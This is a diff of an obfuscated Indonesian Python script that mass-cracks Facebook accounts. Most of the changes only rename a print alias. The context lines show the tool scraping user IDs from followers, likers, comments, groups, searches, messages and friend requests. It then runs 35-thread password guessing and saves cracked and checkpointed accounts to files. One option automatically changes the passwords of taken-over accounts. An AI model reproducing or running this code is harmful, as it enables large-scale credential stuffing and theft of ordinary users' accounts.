@@ -329,14 +329,14 @@ def ugen():
     elif pmu in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
     elif pmu in ['2','02','002','b']:
         os.system("rm -rf ugent.txt");ua = _cici_dapunta_("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
-        try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
-        except (KeyError,IOError):jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M));_dapunta_cici_('%s║'%(M));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
+        try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+        except (KeyError,IOError):jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M));_dvanme_ferly_('%s║'%(M));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
     elif pmu in ['3','03','003','c']:ugen_hp()
-    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O));_dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
     elif pmu in ['5','05','005','e']:
         try:ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
         except (KeyError,IOError):ungser = 'Tidak Ditemukan'
-        _dvanme_ferly_("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
+        _dvanme_ferly_("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O));_dvanme_ferly_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
     elif pmu in ['0','00','000','f']:menu()
     else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
 def ugen_hp():
@@ -399,7 +399,7 @@ def followers(cookies):
     except:pass
     exec_followers(_url_dev_,cookies,_file_);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 def exec_followers(url,cookies,_file_):
-    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dvanme_ferly_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
     try:
         for _cici_ in _sop_dev_.find_all('a',href=True):
             if "profile.php" in _cici_.get('href'):
@@ -416,14 +416,14 @@ def exec_followers(url,cookies,_file_):
 
 ### Dump ID From Likers Post
 def main_likers(_dapunta_):
-    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
+    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
     try:os.remove(_query_+'.json')
     except:pass
     _dapunta_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_dapunta_,_url_,_file_)
     if len(_dapunta_dapunta_(_file_).read().splitlines()) == 0:_dvanme_ferly_('\n%s╚══[%s!%s] %sPostingan Tidak Ditemukan'%(M,P,M,P));_cici_cici_()
-    _dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+    _dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 def scrape_likers(_dapunta_,_url_,_file_):
-    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dvanme_ferly_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             for _id_ in _isi_.find_all('a',href=True):
@@ -459,12 +459,12 @@ def scrape_komen(_dapunta_,_url_,_file_):
             if "Lihat komentar lainnya…" in _lanjut_.text:
                 while True:
                     try:scrape_komen(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
-                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
+                    except Exception as e:_dvanme_ferly_('%s%s'%(M,e))
             elif "Lihat komentar sebelumnya…" in _lanjut_.text:
                 while True:
                     try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
-                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
-    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+                    except Exception as e:_dvanme_ferly_('%s%s'%(M,e))
+    except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 
 ### Dump ID From Group
 class dump_grup:
@@ -477,7 +477,7 @@ class dump_grup:
                 if "category" in _cici_.get("href") or "create" in _cici_.get("href"):continue
                 else:self.glist.append({"id":"".join(bs4.re.findall("/groups/(.*?)\?",_cici_.get("href"))),"name":_cici_.text})
         if len(self.glist) !=0:
-            _dvanme_ferly_("%s╠══[%s•%s] %sKamu Bergabung Dalam %s%s%s Grup"%(O,P,O,P,O,len(self.glist),P));_dapunta_cici_('%s╠══[%s1%s] %sCari Semua Grup Bergabung'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCari Grup Berdasar Nama'%(O,P,O,P));_dapunta_cici_('%s╠══[%s3%s] %sCari Grup Berdasar ID'%(O,P,O,P))
+            _dvanme_ferly_("%s╠══[%s•%s] %sKamu Bergabung Dalam %s%s%s Grup"%(O,P,O,P,O,len(self.glist),P));_dvanme_ferly_('%s╠══[%s1%s] %sCari Semua Grup Bergabung'%(O,P,O,P));_dvanme_ferly_('%s╠══[%s2%s] %sCari Grup Berdasar Nama'%(O,P,O,P));_dvanme_ferly_('%s╠══[%s3%s] %sCari Grup Berdasar ID'%(O,P,O,P))
             while True:
                 c=_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dvanme_ferly_('%s║'%(O))
                 if c=="":continue
@@ -533,7 +533,7 @@ class dump_grup:
                     except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                     except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                 elif xd in ['u','U','2']:
-                    try:self.dump_username("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
+                    try:self.dump_username("https://m.facebook.com/groups/"+id);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                     except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                     except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                 else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()    
@@ -547,7 +547,7 @@ class dump_grup:
             else:self.choice(whitelist,q)
     def choice(self, whitelist,q):
         try:
-            self.listed=whitelist[int(_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P)))-int(1)];self.f(q);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
+            self.listed=whitelist[int(_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P)))-int(1)];self.f(q);_dvanme_ferly_('%s║'%(O));_dvanme_ferly_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
             if xd in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
             elif xd in ['i','I','1']:
                 try:self.dump_id("https://m.facebook.com/groups/"+self.listed.get("id"));_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
@@ -567,7 +567,7 @@ class dump_grup:
         except:pass
         _dapunta_dapunta_(self.fl,"w").close()
     def dump_username(self, url):
-        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
+        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dvanme_ferly_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
         for i in r.find_all("h3"):
             try:
                 if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
@@ -626,7 +626,7 @@ def dump_name(_dapunta_):
     try:os.remove(_file_)
     except:pass
     for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_dapunta_,_url_)
-    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dvanme_ferly_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
     return crack(_file_)
 def cari_nama(_file_,_cookies_,_url_):
     _dapunta_dapunta_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
@@ -664,15 +664,15 @@ class dump_pesan:
                         if _user_ in self.id:continue
                         else:
                             if "pengguna facebook" in _dev_.text.lower():continue
-                            _dapunta_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
+                            _dapunta_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));_dvanme_ferly_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
                 except Exception as e:continue
             if "Lihat Pesan Sebelumnya" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
-        _buka_file_ = _dapunta_dapunta_(self.files,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
+        _buka_file_ = _dapunta_dapunta_(self.files,'r').read().splitlines();_dvanme_ferly_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
         return crack(self.files)
 
 ### Dump ID From Files
 def dump_file():
-    _dapunta_cici_("%s╠══[%s•%s] %sContoh : /sdcard/dapunta.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
+    _dvanme_ferly_("%s╠══[%s•%s] %sContoh : /sdcard/dapunta.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
     try:_baca_ = _dapunta_dapunta_(_files_,'r').read();_buku_ = _baca_.replace(_sekat_,'•');_dapunta_dapunta_(_files_,'w').write(_buku_)
     except:jalan('%s╚══[%s!%s] %sFile Tidak Ditemukan'%(M,P,M,P));menu()
     return crack(_files_)
@@ -773,8 +773,8 @@ def _random_old_(_file_):
             id = (str(_dig_)+str(x))
             try:open(_file_,'a+').write('%s\n'%(id))
             except :pass
-            _dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Generate %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
-    except:_dapunta_cici_('');return set_pass_dev(_file_)
+            _dvanme_ferly_ ("\r%s╠══[%s•%s] %sSedang Generate %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    except:_dvanme_ferly_('');return set_pass_dev(_file_)
 def _random_new_(_file_):
     try:
         open(_file_,'a')
@@ -886,16 +886,16 @@ def exec_hashtag(url,cookies,_file_):
                         except:pass
             for _dapunta_ in _sop_dev_.find_all('a',href=True):
                 if 'Lihat Hasil Selanjutnya' in _dapunta_.text:url_dev = _dapunta_.get('href');exec_hashtag(url_dev,cookies,_file_)
-    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+    except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 
 ### Dump ID Dari Beranda
 def beranda(cookies):
     _url_dev_ = 'https://mbasic.facebook.com/home.php';_file_ = 'beranda.json'
     try:os.remove(_file_)
     except:pass
-    _dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_beranda(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
+    _dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_beranda(_url_dev_,cookies,_file_);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 def exec_beranda(url,cookies,_file_):
-    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dvanme_ferly_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
     try:
         for _cici_ in _sop_dev_.find_all('h3'):
             for _dapunta_ in _cici_.find_all('a',href=True):
@@ -942,7 +942,7 @@ def permintaan_pertemanan_keluar(cookies):
     except:pass
     _dvanme_ferly_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_permintaan_pertemanan_keluar(_url_dev_,cookies,_file_);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
 def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
-    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
+    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dvanme_ferly_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
     try:
         for _dapunta_ in _sop_dev_.find_all('a',href=True):
             if '/friends/hovercard' in _dapunta_.get('href'):
@@ -1317,7 +1317,7 @@ class crack:
                     elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                     elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
                     else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
-                except Exception as e:_dapunta_cici_(("   %s"%e))
+                except Exception as e:_dvanme_ferly_(("   %s"%e))
     def pwlist(self):
         self.pw = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
         if len(self.pw) ==0:self.pwlist()
@@ -1358,7 +1358,7 @@ class crack:
                         self.ada.append("%s•%s"%(fl.get("id"),i));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                 else:continue
             self.ko+=1
-            _dapunta_cici_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+            _dvanme_ferly_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
         except:self.start_crack(fl)
 
 def set_pass_dev(_file_):
@@ -1405,7 +1405,7 @@ def crack_langsung_dev(_user_id_,_password_):
                 if _user_id_ in files_ok:pass
                 else:
                     if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
-                    else:_dapunta_cici_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_)))
+                    else:_dvanme_ferly_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_)))
                     ok.append("%s•%s"%(_user_id_,_pass_));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(_user_id_,_pass_));break
             else:continue
         _putar_ += 1
@@ -1424,7 +1424,7 @@ def teman_target():
             ada2 = _req_get_('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(id,token));idi2 = _js_lo_(ada2.text)
             try:
                 for b in idi2['data']:te.append(b['id'])
-            except KeyError:_dapunta_cici_('╠══[!] Private')
+            except KeyError:_dvanme_ferly_('╠══[!] Private')
             _dvanme_ferly_('╠══[•]',id,'•',len(te));te.clear()
         except KeyError:_dvanme_ferly_('╠══[!] Akun Terkena Spam')
     _dvanme_ferly_('║');_cici_dapunta_('╚══[ Kembali ]');menu()
@@ -1442,10 +1442,10 @@ def hasil():
             if files == "":jalan('%s═══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));hasil()
             try:
                 ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
-                for x in ppp:yyy = x.replace('•',' • ');_dapunta_cici_('%s[%sOK%s] %s'%(H,P,H,yyy))
-                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
+                for x in ppp:yyy = x.replace('•',' • ');_dvanme_ferly_('%s[%sOK%s] %s'%(H,P,H,yyy))
+                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dvanme_ferly_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
             except:_dvanme_ferly_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
-        except (KeyError,IOError):_dapunta_cici_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
+        except (KeyError,IOError):_dvanme_ferly_('%s╠══[%s Hasil Tidak Ditemukan %s]'%(M,P,M))
     elif ch in ['2','02','002','b']:
         try:
             cpl = os.listdir("CP");_dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s Hasil Crack Yang Tersimpan Di File CP %s]'%(O,P,O));_dvanme_ferly_('%s║'%(O))
@@ -1468,7 +1468,7 @@ def cek_hasil():
     print('%s╠══[ %sCek Opsi Akun Hasil Crack %s]'%(O,P,O));_dvanme_ferly_('%s║'%(O));_dvanme_ferly_('%s╠══[%s•%s] %sContoh File : %s.txt'%(O,P,O,P,tanggal));files__ = _cici_dapunta_('%s╠══[%s•%s] %sFile : '%(O,P,O,P));files = "CP/"+files__
     try:buka_baju = _dapunta_dapunta_(files,"r").read().splitlines()
     except FileNotFoundError:_dvanme_ferly_("%s╚══[%s!%s] %sFile Tidak Ada"%(M,P,M,P));time.sleep(2); menu()
-    auto_ganti_pass('Ya');_dvanme_ferly_("%s╚══[%s•%s] %sJumlah Akun : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
+    auto_ganti_pass('Ya');_dvanme_ferly_("%s╚══[%s•%s] %sJumlah Akun : %s"%(O,P,O,P,str(len(buka_baju))));_dvanme_ferly_("")
     for memek in buka_baju:
         if 'â€¢' in memek:memek = memek.replace('â€¢','•')
         kontol = memek.replace("•"," • ");titid  = memek.split("•")
